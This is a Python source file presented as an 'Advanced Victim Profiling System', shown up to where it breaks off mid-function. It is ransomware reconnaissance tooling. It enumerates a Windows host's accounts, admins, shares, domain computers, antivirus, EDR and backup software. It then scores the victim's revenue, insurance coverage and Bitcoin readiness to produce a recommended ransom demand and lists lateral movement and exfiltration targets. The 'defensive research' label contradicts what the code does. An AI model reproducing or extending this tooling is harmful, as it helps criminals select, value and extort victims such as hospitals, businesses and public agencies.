#!/usr/bin/env python3
"""
Advanced Victim Profiling System
Analyzes victim environment to optimize attack strategy
For defensive cybersecurity research purposes only
"""

import os
import sys
import json
import time
import hashlib
import subprocess
import platform
import socket
import sqlite3
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import psutil
try:
    import win32api
    import win32con
    import win32security
    import win32net
    import win32netcon
    import wmi
except ImportError:
    print("[!] Windows modules not available - some features will be limited")
    win32api = None
    win32con = None
    win32security = None
    win32net = None
    win32netcon = None
    wmi = None

try:
    import requests
except ImportError:
    requests = None

try:
    import geoip2.database
except ImportError:
    geoip2 = None

from datetime import datetime


class AdvancedVictimProfiler:
    def __init__(self):
        self.profile_data = {
            'system_info': {},
            'network_info': {},
            'security_info': {},
            'business_info': {},
            'financial_info': {},
            'attack_surface': {},
            'value_assessment': {},
            'targeting_priority': 'unknown'
        }
        
        # Value assessment thresholds
        self.value_tiers = {
            'individual': {'max_payment': 500, 'priority': 1},
            'small_business': {'max_payment': 5000, 'priority': 2},
            'medium_enterprise': {'max_payment': 50000, 'priority': 3},
            'large_enterprise': {'max_payment': 500000, 'priority': 4},
            'government': {'max_payment': 1000000, 'priority': 5},
            'critical_infrastructure': {'max_payment': 5000000, 'priority': 6}
        }
    
    def generate_comprehensive_profile(self) -> Dict:
        """Generate complete victim profile"""
        print("[+] Starting comprehensive victim profiling...")
        
        # System profiling
        self.profile_data['system_info'] = self._profile_system()
        
        # Network environment
        self.profile_data['network_info'] = self._profile_network()
        
        # Security posture
        self.profile_data['security_info'] = self._profile_security()
        
        # Business environment
        self.profile_data['business_info'] = self._profile_business_environment()
        
        # Financial indicators
        self.profile_data['financial_info'] = self._assess_financial_capacity()
        
        # Attack surface analysis
        self.profile_data['attack_surface'] = self._analyze_attack_surface()
        
        # Value assessment
        self.profile_data['value_assessment'] = self._assess_victim_value()
        
        # Generate targeting recommendation
        self.profile_data['targeting_priority'] = self._calculate_targeting_priority()
        
        print("[+] Victim profiling complete")
        return self.profile_data
    
    def _profile_system(self) -> Dict:
        """Profile system hardware, OS, and configuration"""
        system_info = {
            'hostname': socket.gethostname(),
            'domain': self._get_domain_info(),
            'os_info': {
                'name': platform.system(),
                'version': platform.version(),
                'release': platform.release(),
                'architecture': platform.machine(),
                'processor': platform.processor()
            },
            'hardware': {
                'cpu_count': psutil.cpu_count(),
                'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
                'disk_space_gb': round(sum([shutil.disk_usage(d.mountpoint).total 
                                          for d in psutil.disk_partitions()]) / (1024**3), 2)
            },
            'installed_software': self._enumerate_installed_software(),
            'user_accounts': self._enumerate_user_accounts(),
            'running_processes': self._get_running_processes(),
            'system_uptime': self._get_system_uptime()
        }
        
        return system_info
    
    def _get_domain_info(self) -> Dict:
        """Get domain and workgroup information"""
        try:
            import win32api
            domain_info = {
                'domain_joined': False,
                'domain_name': None,
                'workgroup': None,
                'domain_controller': None
            }
            
            try:
                # Try to get domain information
                domain_name = win32api.GetComputerNameEx(win32con.ComputerNameDnsDomain)
                if domain_name:
                    domain_info['domain_joined'] = True
                    domain_info['domain_name'] = domain_name
                    
                    # Try to find domain controller
                    try:
                        import win32net
                        dc_info = win32net.NetGetDCName(None, domain_name)
                        domain_info['domain_controller'] = dc_info
                    except:
                        pass
                        
            except:
                # Fallback to workgroup
                try:
                    workgroup = win32api.GetComputerNameEx(win32con.ComputerNameNetBIOS)
                    domain_info['workgroup'] = workgroup
                except:
                    pass
            
            return domain_info
            
        except ImportError:
            return {'error': 'Windows API not available'}
    
    def _enumerate_installed_software(self) -> List[Dict]:
        """Enumerate installed software and licenses"""
        software_list = []
        
        try:
            # Query WMI for installed software
            c = wmi.WMI()
            for product in c.Win32_Product():
                software_info = {
                    'name': product.Name,
                    'version': product.Version,
                    'vendor': product.Vendor,
                    'install_date': product.InstallDate,
                    'license_required': self._check_software_license_value(product.Name)
                }
                software_list.append(software_info)
                
        except Exception as e:
            print(f"[!] Software enumeration error: {e}")
            
        return software_list[:50]  # Limit to top 50 for performance
    
    def _check_software_license_value(self, software_name: str) -> Dict:
        """Assess if software requires expensive licenses"""
        high_value_software = {
            'Adobe': {'category': 'creative', 'approx_cost': 600},
            'Autodesk': {'category': 'engineering', 'approx_cost': 4000},
            'Microsoft Office': {'category': 'productivity', 'approx_cost': 400},
            'SQL Server': {'category': 'database', 'approx_cost': 15000},
            'Oracle': {'category': 'database', 'approx_cost': 50000},
            'SAP': {'category': 'erp', 'approx_cost': 100000},
            'SolidWorks': {'category': 'engineering', 'approx_cost': 8000},
            'Maya': {'category': 'creative', 'approx_cost': 2000},
            'Matlab': {'category': 'engineering', 'approx_cost': 5000}
        }
        
        for vendor, info in high_value_software.items():
            if vendor.lower() in software_name.lower():
                return {
                    'high_value': True,
                    'category': info['category'],
                    'estimated_cost': info['approx_cost']
                }
        
        return {'high_value': False, 'category': 'standard', 'estimated_cost': 0}
    
    def _enumerate_user_accounts(self) -> List[Dict]:
        """Enumerate user accounts and privilege levels"""
        users = []
        
        try:
            import win32net
            import win32netcon
            
            # Enumerate local users
            resume = 0
            while True:
                try:
                    user_list, total, resume = win32net.NetUserEnum(
                        None, 1, win32netcon.FILTER_NORMAL_ACCOUNT, resume
                    )
                    
                    for user_info in user_list:
                        user_data = {
                            'username': user_info['name'],
                            'full_name': user_info.get('full_name', ''),
                            'comment': user_info.get('comment', ''),
                            'last_logon': user_info.get('last_logon', 0),
                            'privilege_level': user_info.get('priv', 0),
                            'is_admin': self._check_admin_privileges(user_info['name'])
                        }
                        users.append(user_data)
                    
                    if resume == 0:
                        break
                        
                except Exception as e:
                    break
                    
        except ImportError:
            print("[!] Windows networking API not available")
            
        return users
    
    def _check_admin_privileges(self, username: str) -> bool:
        """Check if user has administrative privileges"""
        try:
            import win32net
            import win32netcon
            
            # Get user groups
            groups, _, _ = win32net.NetUserGetGroups(None, username)
            
            admin_groups = ['Administrators', 'Domain Admins', 'Enterprise Admins']
            for group in groups:
                if group['name'] in admin_groups:
                    return True
                    
        except:
            pass
            
        return False
    
    def _get_running_processes(self) -> List[Dict]:
        """Get running processes with security context"""
        processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username', 'create_time']):
            try:
                proc_info = proc.info
                proc_info['is_security_software'] = self._identify_security_software(proc_info['name'])
                processes.append(proc_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return processes[:100]  # Limit for performance
    
    def _identify_security_software(self, process_name: str) -> Dict:
        """Identify security software from process names"""
        security_software = {
            'antivirus': [
                'avp.exe', 'avgnt.exe', 'avguard.exe', 'bdagent.exe', 'mbam.exe',
                'msmpeng.exe', 'windefend.exe', 'kavfs.exe', 'nod32.exe'
            ],
            'firewall': [
                'zlclient.exe', 'outpost.exe', 'pffw.exe', 'comodo.exe'
            ],
            'edr': [
                'crowdstrike.exe', 'carbon.exe', 'sentinelagent.exe', 'cybereason.exe'
            ],
            'backup': [
                'veeam.exe', 'acronis.exe', 'backup.exe', 'bacula.exe'
            ]
        }
        
        process_lower = process_name.lower()
        
        for category, processes in security_software.items():
            for sec_process in processes:
                if sec_process in process_lower:
                    return {'category': category, 'detected': True, 'process': process_name}
        
        return {'category': None, 'detected': False, 'process': process_name}
    
    def _get_system_uptime(self) -> int:
        """Get system uptime in hours"""
        try:
            uptime_seconds = time.time() - psutil.boot_time()
            return int(uptime_seconds / 3600)  # Convert to hours
        except:
            return 0
    
    def _profile_network(self) -> Dict:
        """Profile network environment and infrastructure"""
        network_info = {
            'network_interfaces': self._get_network_interfaces(),
            'network_shares': self._enumerate_network_shares(),
            'domain_computers': self._enumerate_domain_computers(),
            'internet_connectivity': self._test_internet_connectivity(),
            'geolocation': self._get_geolocation(),
            'network_topology': self._analyze_network_topology()
        }
        
        return network_info
    
    def _get_network_interfaces(self) -> List[Dict]:
        """Get network interface information"""
        interfaces = []
        
        for interface, addrs in psutil.net_if_addrs().items():
            interface_info = {
                'name': interface,
                'addresses': []
            }
            
            for addr in addrs:
                addr_info = {
                    'family': str(addr.family),
                    'address': addr.address,
                    'netmask': addr.netmask
                }
                interface_info['addresses'].append(addr_info)
            
            interfaces.append(interface_info)
        
        return interfaces
    
    def _enumerate_network_shares(self) -> List[Dict]:
        """Enumerate accessible network shares"""
        shares = []
        
        try:
            import win32net
            
            resume = 0
            while True:
                try:
                    share_list, total, resume = win32net.NetShareEnum(None, 1, resume)
                    
                    for share_info in share_list:
                        share_data = {
                            'name': share_info['netname'],
                            'path': share_info['path'],
                            'comment': share_info['remark'],
                            'type': share_info['type'],
                            'accessible': self._test_share_access(share_info['netname'])
                        }
                        shares.append(share_data)
                    
                    if resume == 0:
                        break
                        
                except Exception:
                    break
                    
        except ImportError:
            print("[!] Network share enumeration requires Windows API")
            
        return shares
    
    def _test_share_access(self, share_name: str) -> bool:
        """Test access to network share"""
        try:
            share_path = f"\\\\{socket.gethostname()}\\{share_name}"
            return os.path.exists(share_path)
        except:
            return False
    
    def _enumerate_domain_computers(self) -> List[str]:
        """Enumerate computers in the domain"""
        computers = []
        
        try:
            import win32net
            import win32netcon
            
            # Try to enumerate domain computers
            resume = 0
            while True:
                try:
                    computer_list, total, resume = win32net.NetServerEnum(
                        None, 100, win32netcon.SV_TYPE_WORKSTATION | win32netcon.SV_TYPE_SERVER, None, resume
                    )
                    
                    for computer_info in computer_list:
                        computers.append({
                            'name': computer_info['name'],
                            'platform': computer_info.get('platform_id', 0),
                            'version': computer_info.get('version_major', 0)
                        })
                    
                    if resume == 0:
                        break
                        
                except Exception:
                    break
                    
        except ImportError:
            print("[!] Domain enumeration requires Windows API")
            
        return computers[:50]  # Limit for performance
    
    def _test_internet_connectivity(self) -> Dict:
        """Test internet connectivity and identify ISP"""
        connectivity_info = {
            'has_internet': False,
            'public_ip': None,
            'isp': None,
            'country': None,
            'bandwidth_estimate': None
        }
        
        try:
            # Test connectivity with multiple methods
            response = requests.get('https://httpbin.org/ip', timeout=10)
            if response.status_code == 200:
                connectivity_info['has_internet'] = True
                ip_data = response.json()
                connectivity_info['public_ip'] = ip_data.get('origin')
                
                # Get ISP and location info
                geo_info = self._get_ip_geolocation(connectivity_info['public_ip'])
                connectivity_info.update(geo_info)
                
        except Exception as e:
            print(f"[!] Internet connectivity test failed: {e}")
        
        return connectivity_info
    
    def _get_geolocation(self) -> Dict:
        """Get geographical location information"""
        # This would typically use a GeoIP database
        # For research purposes, using a simplified version
        return {
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'timezone': 'Unknown',
            'coordinates': None
        }
    
    def _get_ip_geolocation(self, ip_address: str) -> Dict:
        """Get geolocation info for IP address"""
        try:
            # Use a free IP geolocation service
            response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
        except:
            pass
        
        return {'country': 'Unknown', 'isp': 'Unknown'}
    
    def _analyze_network_topology(self) -> Dict:
        """Analyze network topology and identify critical systems"""
        topology = {
            'network_size': 'unknown',
            'domain_controllers': [],
            'file_servers': [],
            'database_servers': [],
            'backup_servers': [],
            'critical_services': []
        }
        
        # Analyze based on running services and network shares
        processes = self.profile_data.get('system_info', {}).get('running_processes', [])
        
        # Identify server roles based on running processes
        server_indicators = {
            'domain_controller': ['lsass.exe', 'ntds.exe', 'dns.exe'],
            'file_server': ['lanmanserver.exe', 'srv.exe'],
            'database_server': ['sqlservr.exe', 'oracle.exe', 'mysqld.exe'],
            'backup_server': ['veeam.exe', 'backup.exe', 'bacula.exe'],
            'web_server': ['w3wp.exe', 'httpd.exe', 'nginx.exe']
        }
        
        for role, indicators in server_indicators.items():
            for process in processes:
                if any(indicator in process.get('name', '').lower() for indicator in indicators):
                    topology['critical_services'].append({
                        'role': role,
                        'process': process.get('name'),
                        'pid': process.get('pid')
                    })
        
        return topology
    
    def _profile_security(self) -> Dict:
        """Profile security controls and defenses"""
        security_info = {
            'antivirus': self._detect_antivirus(),
            'firewall': self._check_firewall_status(),
            'edr_solution': self._detect_edr(),
            'backup_solutions': self._detect_backup_software(),
            'patch_level': self._assess_patch_level(),
            'security_policies': self._check_security_policies(),
            'privileged_accounts': self._identify_privileged_accounts()
        }
        
        return security_info
    
    def _detect_antivirus(self) -> Dict:
        """Detect installed antivirus solutions"""
        av_info = {
            'detected': False,
            'products': [],
            'real_time_protection': False,
            'last_update': None
        }
        
        try:
            # Check Windows Security Center
            import win32com.client
            
            wmi_service = win32com.client.GetObject("winmgmts:")
            av_products = wmi_service.ExecQuery("SELECT * FROM AntiVirusProduct", "WQL", 0x10 | 0x20)
            
            for product in av_products:
                product_info = {
                    'name': product.displayName,
                    'state': product.productState,
                    'enabled': (product.productState & 0x1000) != 0,
                    'updated': (product.productState & 0x10) == 0
                }
                av_info['products'].append(product_info)
                
            av_info['detected'] = len(av_info['products']) > 0
            
        except Exception as e:
            print(f"[!] AV detection error: {e}")
            
        return av_info
    
    def _check_firewall_status(self) -> Dict:
        """Check Windows Firewall status"""
        firewall_info = {
            'windows_firewall_enabled': False,
            'third_party_firewall': None,
            'profiles': {}
        }
        
        try:
            import subprocess
            
            # Check Windows Firewall status
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                output = result.stdout
                firewall_info['windows_firewall_enabled'] = 'State ON' in output
                
        except Exception as e:
            print(f"[!] Firewall check error: {e}")
            
        return firewall_info
    
    def _detect_edr(self) -> Dict:
        """Detect EDR (Endpoint Detection and Response) solutions"""
        edr_info = {
            'detected': False,
            'products': []
        }
        
        edr_processes = [
            'crowdstrike', 'carbon', 'sentinelagent', 'cybereason', 'msmpeng',
            'defender', 'symantec', 'mcafee', 'trendmicro', 'kaspersky'
        ]
        
        processes = psutil.process_iter(['name'])
        for proc in processes:
            try:
                proc_name = proc.info['name'].lower()
                for edr in edr_processes:
                    if edr in proc_name:
                        edr_info['products'].append(proc.info['name'])
                        edr_info['detected'] = True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        return edr_info
    
    def _detect_backup_software(self) -> Dict:
        """Detect backup and recovery solutions"""
        backup_info = {
            'solutions_detected': [],
            'backup_running': False,
            'recent_backups': []
        }
        
        backup_processes = [
            'veeam', 'acronis', 'backup', 'bacula', 'veritas', 'commvault'
        ]
        
        processes = psutil.process_iter(['name', 'create_time'])
        for proc in processes:
            try:
                proc_name = proc.info['name'].lower()
                for backup in backup_processes:
                    if backup in proc_name:
                        backup_info['solutions_detected'].append({
                            'name': proc.info['name'],
                            'running': True,
                            'start_time': proc.info['create_time']
                        })
                        backup_info['backup_running'] = True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        return backup_info
    
    def _assess_patch_level(self) -> Dict:
        """Assess system patch level and vulnerabilities"""
        patch_info = {
            'last_update_check': None,
            'pending_updates': 0,
            'critical_updates_pending': 0,
            'update_source': None
        }
        
        try:
            # Check Windows Update status (simplified)
            import subprocess
            
            result = subprocess.run(
                ['powershell', '-Command', 'Get-WUList | Measure-Object | Select-Object Count'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0 and result.stdout:
                # Parse update count from PowerShell output
                try:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if 'Count' in line and ':' in line:
                            count = int(line.split(':')[1].strip())
                            patch_info['pending_updates'] = count
                            break
                except:
                    pass
                    
        except Exception as e:
            print(f"[!] Patch assessment error: {e}")
            
        return patch_info
    
    def _check_security_policies(self) -> Dict:
        """Check security policies and configurations"""
        policies = {
            'password_policy': self._check_password_policy(),
            'account_lockout': self._check_lockout_policy(),
            'audit_policy': self._check_audit_policy(),
            'user_rights': self._check_user_rights()
        }
        
        return policies
    
    def _check_password_policy(self) -> Dict:
        """Check password policy settings"""
        # This would typically query group policy settings
        # Simplified for research purposes
        return {
            'minimum_length': 'unknown',
            'complexity_required': 'unknown',
            'max_age': 'unknown'
        }
    
    def _check_lockout_policy(self) -> Dict:
        """Check account lockout policy"""
        return {
            'lockout_threshold': 'unknown',
            'lockout_duration': 'unknown',
            'reset_counter': 'unknown'
        }
    
    def _check_audit_policy(self) -> Dict:
        """Check audit policy configuration"""
        return {
            'logon_events': 'unknown',
            'account_management': 'unknown',
            'privilege_use': 'unknown'
        }
    
    def _check_user_rights(self) -> List[str]:
        """Check user rights assignments"""
        # Would typically query LSA user rights
        return ['unknown']
    
    def _identify_privileged_accounts(self) -> List[Dict]:
        """Identify accounts with elevated privileges"""
        privileged_accounts = []
        
        users = self.profile_data.get('system_info', {}).get('user_accounts', [])
        for user in users:
            if user.get('is_admin', False) or user.get('privilege_level', 0) > 1:
                privileged_accounts.append({
                    'username': user['username'],
                    'privilege_level': user.get('privilege_level', 0),
                    'last_logon': user.get('last_logon', 0)
                })
                
        return privileged_accounts
    
    def _profile_business_environment(self) -> Dict:
        """Profile business context and environment"""
        business_info = {
            'organization_size': self._estimate_organization_size(),
            'business_type': self._identify_business_type(),
            'critical_applications': self._identify_critical_applications(),
            'data_sensitivity': self._assess_data_sensitivity(),
            'compliance_requirements': self._identify_compliance_requirements(),
            'business_hours': self._determine_business_hours()
        }
        
        return business_info
    
    def _estimate_organization_size(self) -> Dict:
        """Estimate organization size based on various indicators"""
        size_indicators = {
            'domain_computers': len(self.profile_data.get('network_info', {}).get('domain_computers', [])),
            'user_accounts': len(self.profile_data.get('system_info', {}).get('user_accounts', [])),
            'network_shares': len(self.profile_data.get('network_info', {}).get('network_shares', [])),
            'installed_software_diversity': len(self.profile_data.get('system_info', {}).get('installed_software', []))
        }
        
        # Simple heuristic for organization size
        total_score = sum(size_indicators.values())
        
        if total_score < 10:
            org_size = 'individual'
        elif total_score < 50:
            org_size = 'small_business'
        elif total_score < 200:
            org_size = 'medium_enterprise'
        elif total_score < 1000:
            org_size = 'large_enterprise'
        else:
            org_size = 'very_large_enterprise'
        
        return {
            'estimated_size': org_size,
            'indicators': size_indicators,
            'confidence': 'medium'
        }
    
    def _identify_business_type(self) -> Dict:
        """Identify business type based on software and systems"""
        business_indicators = {
            'healthcare': ['epic', 'cerner', 'meditech', 'allscripts', 'hospital'],
            'financial': ['bloomberg', 'reuters', 'trading', 'banking', 'quickbooks'],
            'legal': ['westlaw', 'lexis', 'case', 'legal', 'court'],
            'education': ['blackboard', 'moodle', 'canvas', 'student', 'school'],
            'manufacturing': ['autocad', 'solidworks', 'catia', 'manufacturing', 'scada'],
            'retail': ['pos', 'retail', 'inventory', 'commerce', 'sales'],
            'government': ['government', 'federal', 'state', 'municipal', 'agency'],
            'technology': ['development', 'github', 'jira', 'confluence', 'ide']
        }
        
        installed_software = self.profile_data.get('system_info', {}).get('installed_software', [])
        software_names = ' '.join([sw.get('name', '').lower() for sw in installed_software])
        
        business_scores = {}
        for business_type, keywords in business_indicators.items():
            score = sum(1 for keyword in keywords if keyword in software_names)
            if score > 0:
                business_scores[business_type] = score
        
        if business_scores:
            likely_type = max(business_scores, key=business_scores.get)
            confidence = business_scores[likely_type] / len(business_indicators[likely_type])
        else:
            likely_type = 'general_business'
            confidence = 0.1
        
        return {
            'likely_type': likely_type,
            'confidence': confidence,
            'indicators': business_scores
        }
    
    def _identify_critical_applications(self) -> List[Dict]:
        """Identify business-critical applications"""
        critical_apps = []
        
        # High-value business applications
        critical_indicators = {
            'database': ['sql', 'oracle', 'mysql', 'postgres', 'mongodb'],
            'erp': ['sap', 'oracle', 'dynamics', 'netsuite'],
            'crm': ['salesforce', 'dynamics', 'hubspot'],
            'email': ['exchange', 'outlook', 'thunderbird'],
            'backup': ['veeam', 'acronis', 'backup'],
            'security': ['antivirus', 'firewall', 'edr']
        }
        
        running_processes = self.profile_data.get('system_info', {}).get('running_processes', [])
        installed_software = self.profile_data.get('system_info', {}).get('installed_software', [])
        
        all_software = []
        all_software.extend([p.get('name', '') for p in running_processes])
        all_software.extend([s.get('name', '') for s in installed_software])
        
        for category, indicators in critical_indicators.items():
            for software in all_software:
                for indicator in indicators:
                    if indicator.lower() in software.lower():
                        critical_apps.append({
                            'name': software,
                            'category': category,
                            'criticality': 'high' if category in ['database', 'erp', 'backup'] else 'medium'
                        })
        
        return critical_apps[:20]  # Limit for performance
    
    def _assess_data_sensitivity(self) -> Dict:
        """Assess sensitivity of data on the system"""
        sensitivity_assessment = {
            'financial_data_likely': False,
            'personal_data_likely': False,
            'intellectual_property_likely': False,
            'compliance_data_likely': False,
            'overall_sensitivity': 'low'
        }
        
        # Look for indicators in file paths, software, and business type
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type')
        
        high_sensitivity_types = ['healthcare', 'financial', 'legal', 'government']
        if business_type in high_sensitivity_types:
            sensitivity_assessment['overall_sensitivity'] = 'high'
            if business_type == 'financial':
                sensitivity_assessment['financial_data_likely'] = True
            elif business_type == 'healthcare':
                sensitivity_assessment['personal_data_likely'] = True
                sensitivity_assessment['compliance_data_likely'] = True
        
        return sensitivity_assessment
    
    def _identify_compliance_requirements(self) -> List[str]:
        """Identify likely compliance requirements"""
        compliance_reqs = []
        
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type')
        location = self.profile_data.get('network_info', {}).get('geolocation', {}).get('country')
        
        compliance_mapping = {
            'healthcare': ['HIPAA', 'HITECH'],
            'financial': ['PCI-DSS', 'SOX', 'GLBA'],
            'government': ['FISMA', 'FedRAMP'],
            'education': ['FERPA'],
            'general_business': ['GDPR'] if location in ['EU', 'Europe'] else []
        }
        
        if business_type in compliance_mapping:
            compliance_reqs.extend(compliance_mapping[business_type])
        
        return compliance_reqs
    
    def _determine_business_hours(self) -> Dict:
        """Determine likely business hours based on activity patterns"""
        # This would analyze historical activity patterns
        # Simplified for research purposes
        return {
            'likely_timezone': self.profile_data.get('network_info', {}).get('geolocation', {}).get('timezone', 'UTC'),
            'business_hours': '9-17',  # Default business hours
            'days_active': ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday']
        }
    
    def _assess_financial_capacity(self) -> Dict:
        """Assess financial capacity and payment potential"""
        financial_info = {
            'estimated_revenue': self._estimate_revenue(),
            'payment_capacity': self._estimate_payment_capacity(),
            'cyber_insurance_likely': self._assess_cyber_insurance_likelihood(),
            'bitcoin_capability': self._assess_bitcoin_capability()
        }
        
        return financial_info
    
    def _estimate_revenue(self) -> Dict:
        """Estimate organization revenue based on size and type"""
        org_size = self.profile_data.get('business_info', {}).get('organization_size', {}).get('estimated_size', 'unknown')
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type', 'unknown')
        
        # Revenue estimates by organization size (USD)
        revenue_estimates = {
            'individual': {'min': 0, 'max': 100000},
            'small_business': {'min': 100000, 'max': 1000000},
            'medium_enterprise': {'min': 1000000, 'max': 50000000},
            'large_enterprise': {'min': 50000000, 'max': 1000000000},
            'very_large_enterprise': {'min': 1000000000, 'max': 50000000000}
        }
        
        # Multiply by business type factor
        business_multipliers = {
            'technology': 1.5,
            'financial': 2.0,
            'healthcare': 1.3,
            'government': 1.8,
            'manufacturing': 1.2,
            'retail': 0.8,
            'education': 0.6
        }
        
        base_estimate = revenue_estimates.get(org_size, {'min': 0, 'max': 100000})
        multiplier = business_multipliers.get(business_type, 1.0)
        
        return {
            'estimated_min': int(base_estimate['min'] * multiplier),
            'estimated_max': int(base_estimate['max'] * multiplier),
            'confidence': 'medium' if org_size != 'unknown' else 'low'
        }
    
    def _estimate_payment_capacity(self) -> Dict:
        """Estimate ransom payment capacity"""
        revenue = self.profile_data.get('financial_info', {}).get('estimated_revenue', {})
        org_size = self.profile_data.get('business_info', {}).get('organization_size', {}).get('estimated_size', 'individual')
        
        # Payment capacity as percentage of revenue
        capacity_percentages = {
            'individual': 0.001,      # 0.1%
            'small_business': 0.01,   # 1%
            'medium_enterprise': 0.005, # 0.5%
            'large_enterprise': 0.002,  # 0.2%
            'very_large_enterprise': 0.001  # 0.1%
        }
        
        capacity_percentage = capacity_percentages.get(org_size, 0.001)
        
        if revenue.get('estimated_min'):
            min_payment = int(revenue['estimated_min'] * capacity_percentage)
            max_payment = int(revenue['estimated_max'] * capacity_percentage)
        else:
            # Use tier-based estimates
            tier_payments = self.value_tiers.get(org_size, {'max_payment': 500})
            min_payment = int(tier_payments['max_payment'] * 0.1)
            max_payment = tier_payments['max_payment']
        
        return {
            'estimated_min_payment': min_payment,
            'estimated_max_payment': max_payment,
            'recommended_demand': int((min_payment + max_payment) / 2),
            'currency': 'USD'
        }
    
    def _assess_cyber_insurance_likelihood(self) -> Dict:
        """Assess likelihood of cyber insurance coverage"""
        org_size = self.profile_data.get('business_info', {}).get('organization_size', {}).get('estimated_size', 'individual')
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type', 'general')
        
        # Insurance likelihood by org size
        insurance_likelihood = {
            'individual': 0.05,
            'small_business': 0.3,
            'medium_enterprise': 0.7,
            'large_enterprise': 0.9,
            'very_large_enterprise': 0.95
        }
        
        # Business type multipliers
        type_multipliers = {
            'financial': 1.5,
            'healthcare': 1.4,
            'technology': 1.3,
            'government': 1.2,
            'manufacturing': 1.1,
            'retail': 1.0,
            'education': 0.8
        }
        
        base_likelihood = insurance_likelihood.get(org_size, 0.05)
        multiplier = type_multipliers.get(business_type, 1.0)
        final_likelihood = min(base_likelihood * multiplier, 0.95)
        
        return {
            'likelihood': final_likelihood,
            'likely_covered': final_likelihood > 0.5,
            'estimated_coverage': self._estimate_insurance_coverage(final_likelihood)
        }
    
    def _estimate_insurance_coverage(self, likelihood: float) -> Dict:
        """Estimate insurance coverage amounts"""
        if likelihood < 0.3:
            return {'min_coverage': 0, 'max_coverage': 100000}
        elif likelihood < 0.6:
            return {'min_coverage': 100000, 'max_coverage': 1000000}
        elif likelihood < 0.8:
            return {'min_coverage': 1000000, 'max_coverage': 10000000}
        else:
            return {'min_coverage': 10000000, 'max_coverage': 100000000}
    
    def _assess_bitcoin_capability(self) -> Dict:
        """Assess organization's capability to pay in Bitcoin"""
        org_size = self.profile_data.get('business_info', {}).get('organization_size', {}).get('estimated_size', 'individual')
        business_type = self.profile_data.get('business_info', {}).get('business_type', {}).get('likely_type', 'general')
        
        # Bitcoin capability assessment
        tech_savvy_types = ['technology', 'financial', 'government']
        is_tech_savvy = business_type in tech_savvy_types
        
        capability_scores = {
            'individual': 0.3,
            'small_business': 0.4,
            'medium_enterprise': 0.6,
            'large_enterprise': 0.8,
            'very_large_enterprise': 0.9
        }
        
        base_capability = capability_scores.get(org_size, 0.3)
        if is_tech_savvy:
            base_capability *= 1.5
        
        return {
            'capability_score': min(base_capability, 1.0),
            'likely_capable': base_capability > 0.5,
            'assistance_needed': base_capability < 0.4,
            'estimated_setup_time_hours': int(48 / max(base_capability, 0.1))
        }
    
    def _analyze_attack_surface(self) -> Dict:
        """Analyze attack surface and vulnerabilities"""
        attack_surface = {
            'network_exposure': self._assess_network_exposure(),
            'software_vulnerabilities': self._identify_software_vulnerabilities(),
            'weak_credentials': self._assess_credential_strength(),
            'lateral_movement_opportunities': self._assess_lateral_movement(),
            'persistence_opportunities': self._assess_persistence_opportunities(),
            'data_exfiltration_targets': self._identify_exfiltration_targets()
        }
        
        return attack_surface
    
    def _assess_network_exposure(self) -> Dict:
        """Assess network exposure and attack vectors"""
        exposure_info = {
            'internet_facing_services': [],
            'internal_network_size': 0,
            'network_segmentation': 'unknown',
            'wireless_networks': [],
            'vpn_solutions': []
        }
        
        # Analyze network interfaces and services
        network_info = self.profile_data.get('network_info', {})
        domain_computers = network_info.get('domain_computers', [])
        exposure_info['internal_network_size'] = len(domain_computers)
        
        # Check for common services (simplified)
        running_processes = self.profile_data.get('system_info', {}).get('running_processes', [])
        internet_services = ['iis', 'apache', 'nginx', 'ftp', 'ssh', 'rdp', 'vnc']
        
        for process in running_processes:
            proc_name = process.get('name', '').lower()
            for service in internet_services:
                if service in proc_name:
                    exposure_info['internet_facing_services'].append({
                        'service': service,
                        'process': process.get('name')
                    })
        
        return exposure_info
    
    def _identify_software_vulnerabilities(self) -> List[Dict]:
        """Identify potentially vulnerable software"""
        vulnerabilities = []
        
        installed_software = self.profile_data.get('system_info', {}).get('installed_software', [])
        
        # Known vulnerable software patterns (simplified)
        vulnerable_patterns = {
            'Adobe Flash': {'severity': 'critical', 'cve_count': 1000},
            'Java': {'severity': 'high', 'cve_count': 500},
            'Adobe Reader': {'severity': 'medium', 'cve_count': 300},
            'Internet Explorer': {'severity': 'high', 'cve_count': 800},
            'Microsoft Office': {'severity': 'medium', 'cve_count': 400}
        }
        
        for software in installed_software:
            software_name = software.get('name', '')
            for vuln_software, vuln_info in vulnerable_patterns.items():
                if vuln_software.lower() in software_name.lower():
                    vulnerabilities.append({
                        'software': software_name,
                        'version': software.get('version', 'unknown'),
                        'severity': vuln_info['severity'],
                        'estimated_cve_count': vuln_info['cve_count']
                    })
        
        return vulnerabilities
    
    def _assess_credential_strength(self) -> Dict:
        """Assess credential strength and policies"""
        # This would typically involve password policy analysis
        # Simplified for research purposes
        return {
            'password_policy_strength': 'medium',
            'account_lockout_configured': True,
            'privileged_account_count': len(self.profile_data.get('security_info', {}).get('privileged_accounts', [])),
            'shared_accounts_likely': False
        }
    
    def _assess_lateral_movement(self) -> Dict:
        """Assess lateral movement opportunities"""
        lateral_movement = {
            'domain_joined': self.profile_data.get('system_info', {}).get('domain', {}).get('domain_joined', False),
            'network_shares_count': len(self.profile_data.get('network_info', {}).get('network_shares', [])),
            'admin_shares_available': False,
            'trust_relationships': [],
            'service_accounts': []
        }
        
        # Check for administrative shares
